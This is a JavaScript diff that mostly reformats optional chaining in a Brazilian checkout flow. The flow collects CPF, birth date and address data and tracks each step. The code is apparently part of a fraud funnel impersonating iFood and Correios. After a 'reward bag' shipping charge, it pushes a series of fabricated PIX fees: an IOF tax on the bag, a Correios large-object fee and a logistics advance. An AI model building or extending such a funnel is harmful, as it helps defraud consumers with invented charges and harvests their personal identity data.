@@ -1944,7 +1780,7 @@ function initCheckout() {
         if (checkoutGrandTotal) {
             const showGrandTotal = hasRewardExtra && !!selectedShipping;
             if (showGrandTotal && checkoutGrandTotalPrice) {
-                const total = Number((Number(selectedShipping ? .price || 0) + rewardExtraPrice).toFixed(2));
+                const total = Number((Number(selectedShipping?.price || 0) + rewardExtraPrice).toFixed(2));
                 checkoutGrandTotalPrice.textContent = formatCurrency(total);
             }
             setHidden(checkoutGrandTotal, !showGrandTotal);
@@ -1954,7 +1790,7 @@ function initCheckout() {
     const updateCheckoutActionPanel = () => {
         if (!btnFinish) return;
         btnFinish.classList.remove('hidden');
-        const cepDigits = String(checkoutCep ? .value || '').replace(/\D/g, '');
+        const cepDigits = String(checkoutCep?.value || '').replace(/\D/g, '');
         const hasValidCep = cepDigits.length === 8;
         const hasShipping = !!shipping;
 
@@ -1970,9 +1806,9 @@ function initCheckout() {
         } else if (flowStep === 'frete') {
             if (checkoutNextStep) checkoutNextStep.textContent = 'Escolha o frete ideal para continuar para a proxima etapa.';
         } else if (checkoutNextStep) {
-            checkoutNextStep.textContent = orderBumpHintEnabled ?
-                'Frete selecionado. Agora voce segue para a proxima etapa.' :
-                'Frete selecionado. Agora voce segue direto para o pagamento PIX.';
+            checkoutNextStep.textContent = orderBumpHintEnabled
+                ? 'Frete selecionado. Agora voce segue para a proxima etapa.'
+                : 'Frete selecionado. Agora voce segue direto para o pagamento PIX.';
         }
 
         if (checkoutSelectedShipping) {
@@ -1985,14 +1821,14 @@ function initCheckout() {
             btnFinish.textContent = 'Processando...';
             return;
         }
-        btnFinish.textContent = hasShipping ?
-            checkoutCopy.cta :
-            'Selecione um frete para continuar';
+        btnFinish.textContent = hasShipping
+            ? checkoutCopy.cta
+            : 'Selecione um frete para continuar';
     };
 
     const coupon = loadCoupon();
-    if (couponBanner && (coupon ? .amountOff || coupon ? .discount)) {
-        const amountOff = Number(coupon ? .amountOff || 0) || roundMoney(25.9 * Number(coupon ? .discount || 0));
+    if (couponBanner && (coupon?.amountOff || coupon?.discount)) {
+        const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
         couponBanner.classList.remove('hidden');
         couponBanner.innerHTML = `
             <strong>Cupom aplicado:</strong> ${coupon.code || 'FRETE5'}
@@ -2000,7 +1836,8 @@ function initCheckout() {
         `;
     }
 
-    const personalMissing = !personal || !personal.name || !personal.cpf || !personal.birth || !personal.email || !personal.phone;
+    const personalMissing =
+        !personal || !personal.name || !personal.cpf || !personal.birth || !personal.email || !personal.phone;
 
     if (directCheckout && personalMissing) {
         if (summaryBlock) summaryBlock.classList.add('hidden');
@@ -2008,15 +1845,15 @@ function initCheckout() {
         if (btnEditAddress) btnEditAddress.classList.add('hidden');
     }
 
-    if (summaryName) summaryName.textContent = personal ? .name || '-';
-    if (summaryCpf) summaryCpf.textContent = personal ? .cpf || '-';
-    if (summaryBirth) summaryBirth.textContent = personal ? .birth || '-';
+    if (summaryName) summaryName.textContent = personal?.name || '-';
+    if (summaryCpf) summaryCpf.textContent = personal?.cpf || '-';
+    if (summaryBirth) summaryBirth.textContent = personal?.birth || '-';
     const formatSummaryAddress = () => {
-        const base = address ? .streetLine || '-';
-        const city = address ? .cityLine || '-';
+        const base = address?.streetLine || '-';
+        const city = address?.cityLine || '-';
         const extra = loadAddressExtra();
-        const numberValue = (extra ? .number || '').trim();
-        const numberText = extra ? .noNumber ? 's/n' : numberValue;
+        const numberValue = (extra?.number || '').trim();
+        const numberText = extra?.noNumber ? 's/n' : numberValue;
         const streetWithNumber = numberText ? `${base}, ${numberText}` : base;
         return `${streetWithNumber} · ${city}`;
     };
@@ -2027,10 +1864,10 @@ function initCheckout() {
     };
 
     updateSummaryAddress();
-    if (summaryCep) summaryCep.textContent = address ? .cep || '-';
+    if (summaryCep) summaryCep.textContent = address?.cep || '-';
 
     if (checkoutCep) {
-        checkoutCep.value = address ? .cep || '';
+        checkoutCep.value = address?.cep || '';
         checkoutCep.addEventListener('input', () => {
             maskCep(checkoutCep);
             updateCheckoutActionPanel();
@@ -2057,19 +1894,19 @@ function initCheckout() {
     const getCepDigits = (value) => String(value || '').replace(/\D/g, '');
     const findDefaultShippingOption = (options = []) => {
         if (!Array.isArray(options) || !options.length) return null;
-        const byId = options.find((opt) => String(opt ? .id || '').trim() === 'padrao');
+        const byId = options.find((opt) => String(opt?.id || '').trim() === 'padrao');
         if (byId) return byId;
         const byBasePrice = options.find((opt) => {
-            const basePrice = Number(opt ? .originalPrice || opt ? .basePrice || opt ? .price || 0);
+            const basePrice = Number(opt?.originalPrice || opt?.basePrice || opt?.price || 0);
             return Math.abs(basePrice - 25.9) < 0.001;
         });
         if (byBasePrice) return byBasePrice;
         return options[0] || null;
     };
     const hasResolvedAddressForCep = (rawCep) => {
-        const savedCep = getCepDigits(address ? .cep || '');
-        const hasStreet = !!String(address ? .street || address ? .streetLine || '').trim();
-        const hasCity = !!String(address ? .city || address ? .cityLine || '').trim();
+        const savedCep = getCepDigits(address?.cep || '');
+        const hasStreet = !!String(address?.street || address?.streetLine || '').trim();
+        const hasCity = !!String(address?.city || address?.cityLine || '').trim();
         return rawCep && savedCep === rawCep && hasStreet && hasCity;
     };
 
@@ -2082,28 +1919,20 @@ function initCheckout() {
         showFreightSelection();
         const selected = cachedSelectedId ? options.find((opt) => opt.id === cachedSelectedId) : null;
         if (selected) {
-            selectShipping(selected, options, {
-                autoRestore: true,
-                track: false
-            });
+            selectShipping(selected, options, { autoRestore: true, track: false });
         } else {
             const defaultOption = findDefaultShippingOption(options);
             if (defaultOption) {
-                selectShipping(defaultOption, options, {
-                    autoDefault: true,
-                    track: false
-                });
+                selectShipping(defaultOption, options, { autoDefault: true, track: false });
             }
         }
         if (shouldTrack) {
-            trackLead('frete_options_shown', {
-                stage: 'checkout'
-            });
+            trackLead('frete_options_shown', { stage: 'checkout' });
         }
     };
 
     const handleCepAutoLookup = () => {
-        const rawCep = (checkoutCep ? .value || '').replace(/\D/g, '');
+        const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
         if (rawCep.length !== 8) return;
 
         if (summaryCep) summaryCep.textContent = formatCep(rawCep);
@@ -2149,29 +1978,26 @@ function initCheckout() {
             });
     };
 
-    checkoutCep ? .addEventListener('input', () => {
+    checkoutCep?.addEventListener('input', () => {
         if (cepLookupTimer) clearTimeout(cepLookupTimer);
-        const rawCep = (checkoutCep ? .value || '').replace(/\D/g, '');
+        const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
         if (rawCep.length !== 8) return;
         cepLookupTimer = setTimeout(handleCepAutoLookup, 450);
     });
 
-    btnEditCep ? .addEventListener('click', () => {
+    btnEditCep?.addEventListener('click', () => {
         if (!checkoutCep) return;
         checkoutCep.focus();
         checkoutCep.select();
-        checkoutCep.scrollIntoView({
-            behavior: 'smooth',
-            block: 'center'
-        });
+        checkoutCep.scrollIntoView({ behavior: 'smooth', block: 'center' });
     });
 
     let cachedOptions = null;
     let cachedSelectedId = null;
 
     const isExtraValid = () => {
-        const numberOk = !!(noNumber ? .checked || (addrNumber ? .value || '').trim().length);
-        const complementOk = !!(noComplement ? .checked || (addrComplement ? .value || '').trim().length);
+        const numberOk = !!(noNumber?.checked || (addrNumber?.value || '').trim().length);
+        const complementOk = !!(noComplement?.checked || (addrComplement?.value || '').trim().length);
         return numberOk && complementOk;
     };
 
@@ -2180,9 +2006,9 @@ function initCheckout() {
         freightOptions.innerHTML = '';
         options.forEach((opt) => {
             const hasDiscount = Number(opt.originalPrice || 0) > Number(opt.price || 0);
-            const priceHtml = hasDiscount ?
-                `<span class="price-old">${formatCurrency(opt.originalPrice)}</span><span class="price-new">${formatCurrency(opt.price)}</span>` :
-                `${formatCurrency(opt.price)}`;
+            const priceHtml = hasDiscount
+                ? `<span class="price-old">${formatCurrency(opt.originalPrice)}</span><span class="price-new">${formatCurrency(opt.price)}</span>`
+                : `${formatCurrency(opt.price)}`;
             const label = document.createElement('label');
             label.className = 'freight-option';
             if (opt.id === selectedId) label.classList.add('freight-option--active');
@@ -2210,18 +2036,18 @@ function initCheckout() {
 
     const updateFreightAddress = (addr) => {
         if (!freightAddress) return;
-        if (freightStreet) freightStreet.textContent = addr ? .streetLine || 'Rua não informada';
-        if (freightCity) freightCity.textContent = addr ? .cityLine || 'Cidade não informada';
+        if (freightStreet) freightStreet.textContent = addr?.streetLine || 'Rua não informada';
+        if (freightCity) freightCity.textContent = addr?.cityLine || 'Cidade não informada';
         setHidden(freightAddress, false);
     };
 
     const hydrateExtraAddress = () => {
         const extra = loadAddressExtra();
-        if (addrNumber) addrNumber.value = extra ? .number || '';
-        if (addrComplement) addrComplement.value = extra ? .complement || '';
-        if (addrReference) addrReference.value = extra ? .reference || '';
-        if (noNumber) noNumber.checked = !!extra ? .noNumber;
-        if (noComplement) noComplement.checked = !!extra ? .noComplement;
+        if (addrNumber) addrNumber.value = extra?.number || '';
+        if (addrComplement) addrComplement.value = extra?.complement || '';
+        if (addrReference) addrReference.value = extra?.reference || '';
+        if (noNumber) noNumber.checked = !!extra?.noNumber;
+        if (noComplement) noComplement.checked = !!extra?.noComplement;
 
         if (noNumber && addrNumber) {
             addrNumber.disabled = noNumber.checked;
@@ -2254,7 +2080,7 @@ function initCheckout() {
             });
         }
         [addrNumber, addrComplement, addrReference].forEach((input) => {
-            input ? .addEventListener('input', () => {
+            input?.addEventListener('input', () => {
                 saveAddressExtra(collectExtraAddress());
                 updateSummaryAddress();
             });
@@ -2262,17 +2088,17 @@ function initCheckout() {
     };
 
     const collectExtraAddress = () => ({
-        number: addrNumber ? .value.trim() || '',
-        complement: addrComplement ? .value.trim() || '',
-        reference: addrReference ? .value.trim() || '',
-        noNumber: !!noNumber ? .checked,
-        noComplement: !!noComplement ? .checked
+        number: addrNumber?.value.trim() || '',
+        complement: addrComplement?.value.trim() || '',
+        reference: addrReference?.value.trim() || '',
+        noNumber: !!noNumber?.checked,
+        noComplement: !!noComplement?.checked
     });
 
     const selectShipping = (opt, options, flags = {}) => {
-        const autoRestore = flags ? .autoRestore === true;
-        const autoDefault = flags ? .autoDefault === true;
-        const shouldTrack = flags ? .track !== false;
+        const autoRestore = flags?.autoRestore === true;
+        const autoDefault = flags?.autoDefault === true;
+        const shouldTrack = flags?.track !== false;
         const basePrice = Number(opt.originalPrice || opt.basePrice || opt.price || 0);
         const selectedShipping = {
             ...opt,
@@ -2289,15 +2115,12 @@ function initCheckout() {
         cachedSelectedId = selectedShipping.id;
         shipping = selectedShipping;
         if (shouldTrack) {
-            trackLead('frete_selected', {
-                stage: 'checkout',
-                shipping: selectedShipping
-            });
+            trackLead('frete_selected', { stage: 'checkout', shipping: selectedShipping });
         }
         updateCheckoutTotals(selectedShipping);
-        const labels = freightOptions ? .querySelectorAll('.freight-option') || [];
+        const labels = freightOptions?.querySelectorAll('.freight-option') || [];
         labels.forEach((label) => {
-            label.classList.toggle('freight-option--active', label.querySelector('input') ? .value === selectedShipping.id);
+            label.classList.toggle('freight-option--active', label.querySelector('input')?.value === selectedShipping.id);
         });
         updateCheckoutActionPanel();
     };
@@ -2314,7 +2137,7 @@ function initCheckout() {
     };
 
     const calcShipping = () => {
-        const rawCep = (checkoutCep ? .value || '').replace(/\D/g, '');
+        const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
         if (rawCep.length !== 8) {
             showToast('Digite um CEP válido para calcular o frete.', 'error');
             return;
@@ -2395,10 +2218,7 @@ function initCheckout() {
                 }
                 updateSummaryAddress();
                 updateFreightAddress(updatedAddress);
-                trackLead('frete_calculated', {
-                    stage: 'checkout',
-                    address: updatedAddress
-                });
+                trackLead('frete_calculated', { stage: 'checkout', address: updatedAddress });
                 setHidden(freightDetails, false);
                 setHidden(summaryBlock, false);
                 if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
@@ -2427,10 +2247,10 @@ function initCheckout() {
             });
     };
 
-    btnCalcFreight ? .addEventListener('click', calcShipping);
+    btnCalcFreight?.addEventListener('click', calcShipping);
 
-    btnVerifyFreight ? .addEventListener('click', () => {
-        const rawCep = (checkoutCep ? .value || '').replace(/\D/g, '');
+    btnVerifyFreight?.addEventListener('click', () => {
+        const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
         if (rawCep.length !== 8) {
             showToast('Digite um CEP válido para continuar.', 'error');
             return;
@@ -2440,7 +2260,7 @@ function initCheckout() {
     });
 
     if (shipping && freightOptions) {
-        cachedOptions = buildShippingOptions((checkoutCep ? .value || '').replace(/\D/g, ''));
+        cachedOptions = buildShippingOptions((checkoutCep?.value || '').replace(/\D/g, ''));
         cachedSelectedId = shipping.id;
         setHidden(summaryBlock, false);
         setHidden(freightForm, true);
@@ -2452,7 +2272,7 @@ function initCheckout() {
     if (!shipping) {
         hydrateExtraAddress();
         bindExtraAddress();
-        const savedCepDigits = getCepDigits(address ? .cep || '');
+        const savedCepDigits = getCepDigits(address?.cep || '');
         if (savedCepDigits.length === 8 && hasResolvedAddressForCep(savedCepDigits)) {
             if (checkoutCep) checkoutCep.value = formatCep(savedCepDigits);
             updateFreightAddress(address);
@@ -2510,25 +2330,19 @@ function initCheckout() {
         syncShippingAfterAddressEdit();
     }
 
-    btnFinish ? .addEventListener('click', () => {
+    btnFinish?.addEventListener('click', () => {
         if (!btnFinish) return;
         if (!shipping) {
             showToast('Selecione um frete para continuar.', 'error');
-            freightCard ? .classList.remove('freight-card--focus');
-            freightCard ? .classList.add('freight-card--focus');
+            freightCard?.classList.remove('freight-card--focus');
+            freightCard?.classList.add('freight-card--focus');
             setTimeout(() => {
-                freightCard ? .classList.remove('freight-card--focus');
+                freightCard?.classList.remove('freight-card--focus');
             }, 1100);
             if (freightOptions && !freightOptions.classList.contains('hidden')) {
-                freightOptions.scrollIntoView({
-                    behavior: 'smooth',
-                    block: 'center'
-                });
+                freightOptions.scrollIntoView({ behavior: 'smooth', block: 'center' });
             } else if (checkoutCep) {
-                checkoutCep.scrollIntoView({
-                    behavior: 'smooth',
-                    block: 'center'
-                });
+                checkoutCep.scrollIntoView({ behavior: 'smooth', block: 'center' });
                 checkoutCep.focus();
             }
             return;
@@ -2539,7 +2353,7 @@ function initCheckout() {
             shipping,
             bump: checkoutNeutralBump,
             reward,
-            amount: Number((Number(shipping ? .price || 0) + rewardExtraPrice).toFixed(2))
+            amount: Number((Number(shipping?.price || 0) + rewardExtraPrice).toFixed(2))
         });
         const idleLabel = btnFinish.textContent;
         checkoutSubmitting = true;
@@ -2556,7 +2370,7 @@ function initCheckout() {
                     stage: 'checkout',
                     shipping,
                     reward,
-                    amount: Number((Number(shipping ? .price || 0) + rewardExtraPrice).toFixed(2))
+                    amount: Number((Number(shipping?.price || 0) + rewardExtraPrice).toFixed(2))
                 });
                 showToast('Gerando pagamento...', 'success');
                 createPixCharge(shipping, 0).catch((error) => {
@@ -2607,7 +2421,7 @@ function initOrderBump() {
         shipping,
         reward,
         bump: neutralBump,
-        amount: Number((Number(shipping ? .price || 0) + rewardExtraPrice).toFixed(2))
+        amount: Number((Number(shipping?.price || 0) + rewardExtraPrice).toFixed(2))
     });
     const bumpPrice = 9.9;
 
@@ -2617,7 +2431,7 @@ function initOrderBump() {
                 stage: 'orderbump',
                 shipping,
                 reward,
-                amount: Number((Number(shipping ? .price || 0) + rewardExtraPrice).toFixed(2))
+                amount: Number((Number(shipping?.price || 0) + rewardExtraPrice).toFixed(2))
             });
             createPixCharge(shipping, 0).catch((error) => {
                 showToast(error.message || 'Erro ao gerar o PIX.', 'error');
@@ -2651,7 +2465,7 @@ function initOrderBump() {
             bump: loadBump(),
             shipping,
             reward,
-            amount: Number((Number(shipping ? .price || 0) + rewardExtraPrice + (selected ? bumpPrice : 0)).toFixed(2))
+            amount: Number((Number(shipping?.price || 0) + rewardExtraPrice + (selected ? bumpPrice : 0)).toFixed(2))
         });
 
         createPixCharge(shipping, selected ? bumpPrice : 0)
@@ -2663,8 +2477,8 @@ function initOrderBump() {
             });
     };
 
-    btnAccept ? .addEventListener('click', () => proceedToPix(true));
-    btnDecline ? .addEventListener('click', () => proceedToPix(false));
+    btnAccept?.addEventListener('click', () => proceedToPix(true));
+    btnDecline?.addEventListener('click', () => proceedToPix(false));
 }
 
 function initUpsellIof() {
@@ -2678,12 +2492,7 @@ function initUpsellIof() {
     const pix = loadPix();
     const offerPrice = 17.73;
 
-    trackLead('upsell_iof_view', {
-        stage: 'upsell_iof',
-        shipping,
-        pix,
-        offerPrice
-    });
+    trackLead('upsell_iof_view', { stage: 'upsell_iof', shipping, pix, offerPrice });
 
     const leadName = document.getElementById('upsell-iof-lead-name');
     const currentFrete = document.getElementById('upsell-iof-current-frete');
@@ -2698,18 +2507,18 @@ function initUpsellIof() {
             ...Array.from(document.querySelectorAll('#price'))
         ])
     );
-    const acceptIdleLabel = btnAccept ? .textContent || `Pagar taxa de IOF de ${formatCurrency(offerPrice)}`;
+    const acceptIdleLabel = btnAccept?.textContent || `Pagar taxa de IOF de ${formatCurrency(offerPrice)}`;
     let submitInFlight = false;
 
-    if (leadName && personal ? .name) {
+    if (leadName && personal?.name) {
         const firstName = String(personal.name || '').trim().split(/\s+/)[0];
         leadName.textContent = firstName || 'Parceiro';
     }
     if (currentFrete) {
-        currentFrete.textContent = shipping ? .name || 'Frete padrao iFood';
+        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
     }
     if (currentTxid) {
-        const txid = String(pix ? .idTransaction || '').trim();
+        const txid = String(pix?.idTransaction || '').trim();
         currentTxid.textContent = txid ? txid.slice(-8) : '--';
     }
     iofPriceLabels.forEach((el) => {
@@ -2754,7 +2563,7 @@ function initUpsellIof() {
     };
 
     const handleAccept = async (event) => {
-        event ? .preventDefault ? .();
+        event?.preventDefault?.();
         if (submitInFlight) return false;
         submitInFlight = true;
 
@@ -2783,7 +2592,7 @@ function initUpsellIof() {
                     kind: 'taxa_iof_bag',
                     title: 'Taxa de IOF da BAG',
                     price: offerPrice,
-                    previousTxid: String(pix ? .idTransaction || '').trim(),
+                    previousTxid: String(pix?.idTransaction || '').trim(),
                     targetAfterPaid: 'upsell-correios.html'
                 }
             });
@@ -2806,13 +2615,8 @@ function initUpsellIof() {
     }
     window.initiateCheckout = handleAccept;
 
-    btnSkip ? .addEventListener('click', () => {
-        trackLead('upsell_iof_decline', {
-            stage: 'upsell_iof',
-            shipping,
-            pix,
-            amount: offerPrice
-        });
+    btnSkip?.addEventListener('click', () => {
+        trackLead('upsell_iof_decline', { stage: 'upsell_iof', shipping, pix, amount: offerPrice });
         showToast('Sem problemas. Vamos para o proximo passo.', 'info');
         goToSecondUpsell();
     });
@@ -2829,12 +2633,7 @@ function initUpsellCorreios() {
     const pix = loadPix();
     const offerPrice = 15.96;
 
-    trackLead('upsell_correios_view', {
-        stage: 'upsell_correios',
-        shipping,
-        pix,
-        offerPrice
-    });
+    trackLead('upsell_correios_view', { stage: 'upsell_correios', shipping, pix, offerPrice });
 
     const leadName = document.getElementById('upsell-correios-lead-name');
     const currentFrete = document.getElementById('upsell-correios-current-frete');
@@ -2846,18 +2645,18 @@ function initUpsellCorreios() {
     const priceLabels = Array.from(
         document.querySelectorAll('[data-upsell-correios-price], #upsell-correios-price')
     );
-    const acceptIdleLabel = btnAccept ? .textContent || `Pagar taxa de objeto grande ${formatCurrency(offerPrice)}`;
+    const acceptIdleLabel = btnAccept?.textContent || `Pagar taxa de objeto grande ${formatCurrency(offerPrice)}`;
     let submitInFlight = false;
 
-    if (leadName && personal ? .name) {
+    if (leadName && personal?.name) {
         const firstName = String(personal.name || '').trim().split(/\s+/)[0];
         leadName.textContent = firstName || 'Parceiro';
     }
     if (currentFrete) {
-        currentFrete.textContent = shipping ? .name || 'Frete padrao iFood';
+        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
     }
     if (currentTxid) {
-        const txid = String(pix ? .idTransaction || '').trim();
+        const txid = String(pix?.idTransaction || '').trim();
         currentTxid.textContent = txid ? txid.slice(-8) : '--';
     }
     priceLabels.forEach((el) => {
@@ -2901,7 +2700,7 @@ function initUpsellCorreios() {
         redirect('upsell.html');
     };
 
-    btnAccept ? .addEventListener('click', async () => {
+    btnAccept?.addEventListener('click', async () => {
         if (submitInFlight) return;
         submitInFlight = true;
 
@@ -2930,7 +2729,7 @@ function initUpsellCorreios() {
                     kind: 'taxa_objeto_grande_correios',
                     title: 'Taxa de objeto grande dos Correios',
                     price: offerPrice,
-                    previousTxid: String(pix ? .idTransaction || '').trim(),
+                    previousTxid: String(pix?.idTransaction || '').trim(),
                     targetAfterPaid: 'upsell.html'
                 }
             });
@@ -2942,13 +2741,8 @@ function initUpsellCorreios() {
         }
     });
 
-    btnSkip ? .addEventListener('click', () => {
-        trackLead('upsell_correios_decline', {
-            stage: 'upsell_correios',
-            shipping,
-            pix,
-            amount: offerPrice
-        });
+    btnSkip?.addEventListener('click', () => {
+        trackLead('upsell_correios_decline', { stage: 'upsell_correios', shipping, pix, amount: offerPrice });
         showToast('Tudo certo. Vamos para o adiantamento de frete.', 'info');
         goToThirdUpsell();
     });
@@ -2969,12 +2763,7 @@ function initUpsell() {
     const query = new URLSearchParams(window.location.search || '');
     const paidMode = query.get('paid') === '1';
 
-    trackLead('upsell_view', {
-        stage: 'upsell',
-        shipping,
-        pix,
-        offerPrice
-    });
+    trackLead('upsell_view', { stage: 'upsell', shipping, pix, offerPrice });
 
     const leadName = document.getElementById('upsell-lead-name');
     const currentFrete = document.getElementById('upsell-current-frete');
@@ -2990,15 +2779,15 @@ function initUpsell() {
     const timerLabel = document.getElementById('upsell-timer');
     const benefitsList = document.getElementById('upsell-benefits');
 
-    if (leadName && personal ? .name) {
+    if (leadName && personal?.name) {
         const firstName = String(personal.name || '').trim().split(/\s+/)[0];
         leadName.textContent = firstName || 'Parceiro';
     }
     if (currentFrete) {
-        currentFrete.textContent = shipping ? .name || 'Frete padrao iFood';
+        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
     }
     if (currentTxid) {
-        const txid = String(pix ? .idTransaction || '').trim();
+        const txid = String(pix?.idTransaction || '').trim();
         currentTxid.textContent = txid ? txid.slice(-8) : '--';
     }
 
@@ -3062,17 +2851,13 @@ function initUpsell() {
                 'Acompanhe o rastreio para a previsao final de entrega'
             ].map((text) => `<li>${text}</li>`).join('');
         }
-        trackLead('upsell_paid_view', {
-            stage: 'upsell',
-            shipping,
-            pix
-        });
+        trackLead('upsell_paid_view', { stage: 'upsell', shipping, pix });
         return;
     }
 
     startUpsellCountdown();
 
-    btnAccept ? .addEventListener('click', async () => {
+    btnAccept?.addEventListener('click', async () => {
         const expressShipping = {
             id: 'expresso_1dia',
             name: 'Adiantamento logistica (1 dia)',
@@ -3097,7 +2882,7 @@ function initUpsell() {
                     kind: 'frete_1dia',
                     title: 'Prioridade de envio',
                     price: offerPrice,
-                    previousTxid: String(pix ? .idTransaction || '').trim(),
+                    previousTxid: String(pix?.idTransaction || '').trim(),
                     targetAfterPaid: 'upsell.html?paid=1'
                 }
             });
@@ -3108,12 +2893,8 @@ function initUpsell() {
         }
     });
 
-    btnSkip ? .addEventListener('click', () => {
-        trackLead('upsell_decline', {
-            stage: 'upsell',
-            shipping,
-            pix
-        });
+    btnSkip?.addEventListener('click', () => {
+        trackLead('upsell_decline', { stage: 'upsell', shipping, pix });
         showToast('Tudo certo. Mantemos o prazo padrao da sua entrega.', 'success');
         btnSkip.disabled = true;
     });
@@ -3153,20 +2934,20 @@ function parsePixEmvField(payload = '', targetTag = '') {
 
 function resolvePixMerchantName(pixData) {
     const directName = String(
-        pixData ? .merchantName ||
-        pixData ? .receiverName ||
-        pixData ? .recipientName ||
-        pixData ? .beneficiaryName ||
-        pixData ? .paymentName ||
+        pixData?.merchantName ||
+        pixData?.receiverName ||
+        pixData?.recipientName ||
+        pixData?.beneficiaryName ||
+        pixData?.paymentName ||
         ''
     ).replace(/\s+/g, ' ').trim();
     if (directName) return directName.slice(0, 80);
 
     const paymentCode = String(
-        pixData ? .paymentCode ||
-        pixData ? .pixCode ||
-        pixData ? .copyPaste ||
-        pixData ? .copy_paste ||
+        pixData?.paymentCode ||
+        pixData?.pixCode ||
+        pixData?.copyPaste ||
+        pixData?.copy_paste ||
         ''
     ).trim();
     const merchantName = parsePixEmvField(paymentCode, '59');
@@ -3174,7 +2955,7 @@ function resolvePixMerchantName(pixData) {
 }
 
 function resolvePixPaymentTargetUrl(pixData = {}) {
-    return pixData ? .isUpsell || pixData ? .upsell ? .enabled ? 'pix.html' : 'pix-loading.html';
+    return pixData?.isUpsell || pixData?.upsell?.enabled ? 'pix.html' : 'pix-loading.html';
 }
 
 function initPixLoading() {
@@ -3204,10 +2985,10 @@ function initPixLoading() {
         stage: 'pix',
         shipping,
         pix: {
-            idTransaction: pix ? .idTransaction || '',
+            idTransaction: pix?.idTransaction || '',
             merchantName
         },
-        amount: Number(pix ? .amount || 0)
+        amount: Number(pix?.amount || 0)
     });
 
     if (merchantName && merchantNameEl) {
@@ -3219,22 +3000,11 @@ function initPixLoading() {
         if (merchantFallback) merchantFallback.classList.remove('hidden');
     }
 
-    const steps = [{
-            pct: 28,
-            text: 'Criando codigo Pix seguro...'
-        },
-        {
-            pct: 58,
-            text: 'Separando o nome do recebedor...'
-        },
-        {
-            pct: 84,
-            text: 'Pix pronto para conferencia...'
-        },
-        {
-            pct: 100,
-            text: 'Finalizando seu Pix...'
-        }
+    const steps = [
+        { pct: 28, text: 'Criando codigo Pix seguro...' },
+        { pct: 58, text: 'Separando o nome do recebedor...' },
+        { pct: 84, text: 'Pix pronto para conferencia...' },
+        { pct: 100, text: 'Finalizando seu Pix...' }
     ];
     let completionTimer = null;
     const timers = steps.map((step, index) => setTimeout(() => {
@@ -3259,7 +3029,7 @@ function initPixLoading() {
         redirect('pix.html');
     };
 
-    btnContinue ? .addEventListener('click', goToPix);
+    btnContinue?.addEventListener('click', goToPix);
 }
 
 function initPix() {
@@ -3298,33 +3068,33 @@ function initPix() {
     const pixCorreiosStatus = document.getElementById('pix-correios-status');
     const btnCopyCorreios = document.getElementById('btn-copy-pix-correios');
     const reward = resolveRewardSelection({
-        id: pix ? .rewardId || pix ? .reward ? .id || storedReward ? .id || 'bag',
-        selectedAt: storedReward ? .selectedAt || 0
+        id: pix?.rewardId || pix?.reward?.id || storedReward?.id || 'bag',
+        selectedAt: storedReward?.selectedAt || 0
     });
-    const rewardExtraPrice = Number(pix ? .rewardExtraPrice || getRewardExtraPrice(reward));
+    const rewardExtraPrice = Number(pix?.rewardExtraPrice || getRewardExtraPrice(reward));
 
     const isUpsellPix = Boolean(
-        pix ? .isUpsell ||
-        pix ? .upsell ? .enabled ||
-        String(pix ? .shippingId || '').trim() === 'expresso_1dia' ||
-        /adiantamento|prioridade|expresso|correio|objeto grande/i.test(String(pix ? .shippingName || ''))
+        pix?.isUpsell ||
+        pix?.upsell?.enabled ||
+        String(pix?.shippingId || '').trim() === 'expresso_1dia' ||
+        /adiantamento|prioridade|expresso|correio|objeto grande/i.test(String(pix?.shippingName || ''))
     );
-    const upsellKind = String(pix ? .upsell ? .kind || '').trim().toLowerCase();
-    const upsellTargetAfterPaid = String(pix ? .upsell ? .targetAfterPaid || '').trim();
+    const upsellKind = String(pix?.upsell?.kind || '').trim().toLowerCase();
+    const upsellTargetAfterPaid = String(pix?.upsell?.targetAfterPaid || '').trim();
     const isIofUpsellPix = Boolean(
         isUpsellPix && (
             /iof/.test(upsellKind) ||
-            /iof/.test(String(pix ? .shippingId || '').toLowerCase()) ||
-            /iof/.test(String(pix ? .shippingName || '').toLowerCase()) ||
-            /iof/.test(String(pix ? .upsell ? .title || '').toLowerCase())
+            /iof/.test(String(pix?.shippingId || '').toLowerCase()) ||
+            /iof/.test(String(pix?.shippingName || '').toLowerCase()) ||
+            /iof/.test(String(pix?.upsell?.title || '').toLowerCase())
         )
     );
     const isCorreiosUpsellPix = Boolean(
         isUpsellPix && !isIofUpsellPix && (
             /correios|objeto_grande|objeto grande/.test(upsellKind) ||
-            /correios|objeto_grande|objeto grande/.test(String(pix ? .shippingId || '').toLowerCase()) ||
-            /correios|objeto_grande|objeto grande/.test(String(pix ? .shippingName || '').toLowerCase()) ||
-            /correios|objeto_grande|objeto grande/.test(String(pix ? .upsell ? .title || '').toLowerCase())
+            /correios|objeto_grande|objeto grande/.test(String(pix?.shippingId || '').toLowerCase()) ||
+            /correios|objeto_grande|objeto grande/.test(String(pix?.shippingName || '').toLowerCase()) ||
+            /correios|objeto_grande|objeto grande/.test(String(pix?.upsell?.title || '').toLowerCase())
         )
     );
 
@@ -3339,11 +3109,9 @@ function initPix() {
             title: 'Seguro Bag'
         });
         setStage('pix');
-        createPixCharge(shipping, 0, {
-                sourceStage: 'orderbump_back_fallback'
-            })
+        createPixCharge(shipping, 0, { sourceStage: 'orderbump_back_fallback' })
             .catch((error) => {
-                showToast(error ? .message || 'Erro ao gerar o PIX.', 'error');
+                showToast(error?.message || 'Erro ao gerar o PIX.', 'error');
                 sessionStorage.removeItem(STORAGE_KEYS.orderbumpBackAutoPix);
                 if (pixEmpty) pixEmpty.classList.remove('hidden');
                 if (pixCard) pixCard.classList.add('hidden');
@@ -3397,7 +3165,7 @@ function initPix() {
         stage: 'pix',
         shipping,
         reward,
-        amount: Number(pix ? .amount || 0)
+        amount: Number(pix?.amount || 0)
     });
 
     if (pixAmount) pixAmount.textContent = formatCurrency(pix.amount || 0);
@@ -3406,11 +3174,11 @@ function initPix() {
     if (pixIofStatus) pixIofStatus.textContent = 'Status: Aguardando pagamento';
     if (pixCorreiosStatus) pixCorreiosStatus.textContent = 'Status: Aguardando pagamento';
     if (reward && pixOrderTitle) {
